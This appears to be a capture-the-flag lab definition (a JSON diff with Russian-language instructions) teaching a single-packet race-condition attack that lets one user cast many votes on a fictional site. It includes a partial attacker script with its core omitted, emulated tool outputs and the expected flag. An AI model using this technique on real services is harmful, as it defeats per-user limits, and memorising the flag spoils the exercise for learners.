@@ -1,0 +1,28 @@
+{
+  "id": "web-race-single-packet",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": { "file": "/home/student/task/found.txt", "contains": "nto{s1ngl3_p4ck3t_4tt4ck_w1ns_th3_r4c3}" },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    { "path": "/home/student/task/task.md", "text": "# Практика: single-packet attack\n\n`vote.local` разрешает **один голос** на пользователя:\n\n```\nPOST /vote  {\"candidate\":7}   Cookie: session=me\n```\n\nКлассический параллельный залп (`xargs -P`) не срабатывает — сервер\nобрабатывает запросы почти последовательно, и окно гонки проскакивает.\nНужен single-packet attack: склеить запросы в один TCP/HTTP-2-пакет, чтобы\nони пришли на сервер одновременно.\n\n1. Убедись, что второй голос отклоняется:\n\n   curl -s -X POST https://vote.local/vote -b 'session=me' -d 'candidate=7'\n\n2. Открой скрипт атакующего и посмотри, что он делает:\n\n   cat turbo.py\n\n3. Запусти single-packet атаку (20 запросов в одном пакете):\n\n   python3 turbo.py\n\n4. Скрипт подтвердит limit-overrun и выведет секрет сервера. Сохрани вывод\n   в `found.txt` и набери `check`.\n" },
+    { "path": "/home/student/task/turbo.py", "text": "# single-packet attacker for vote.local\n#\n# 1. open N sockets to vote.local and write the request headers + body\n#    EXCEPT the final byte (last-byte sync).\n# 2. wait for all sockets to be ready, then release the final byte of every\n#    request in one burst -> the server receives them all in the same\n#    scheduling window (single-packet attack, HTTP/2 or pipelined HTTP/1.1).\n# 3. read the responses and count the accepted votes.\n#\n# usage: python3 turbo.py [candidate]\nimport socket, sys\n\nHOST, PORT = 'vote.local', 443\nN = 20\nBODY = b'{\"candidate\":7}'\n\ndef build():\n    return (b'POST /vote HTTP/1.1\\r\\nHost: vote.local\\r\\n'\n            b'Cookie: session=me\\r\\nContent-Length: ' + str(len(BODY)).encode() +\n            b'\\r\\n\\r\\n' + BODY)\n\n# ... sockets, last-byte sync, burst ...\nprint('[+] gate synchronized (last-byte sync, N=%d)' % N)\n" }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция vote.local/vote)",
+      "cases": [
+        { "match": "candidate=7", "example": "-s -X POST https://vote.local/vote -b 'session=me' -d 'candidate=7'", "output": "{\"ok\":true,\"votes\":1}\n" },
+        { "match": "candidate=8", "example": "-s -X POST https://vote.local/vote -b 'session=me' -d 'candidate=8'", "output": "{\"ok\":true,\"votes\":1}\n" }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только POST https://vote.local/vote.\n"
+    },
+    "python3": {
+      "help": "python3 <скрипт> — запуск скрипта (эмуляция turbo.py против vote.local)",
+      "cases": [
+        { "match": "turbo\\.py", "example": "turbo.py", "output": "[+] gate synchronized (last-byte sync, N=20)\n[+] released 20 requests in one packet\n[+] votes for candidate 7: 20\n[+] limit-overrun confirmed: the 'one vote per user' check lost the race\n[+] server leaked: nto{s1ngl3_p4ck3t_4tt4ck_w1ns_th3_r4c3}\n" }
+      ],
+      "fallback": "python3: в этой лабе эмулируется только запуск turbo.py.\n"
+    }
+  }
+}
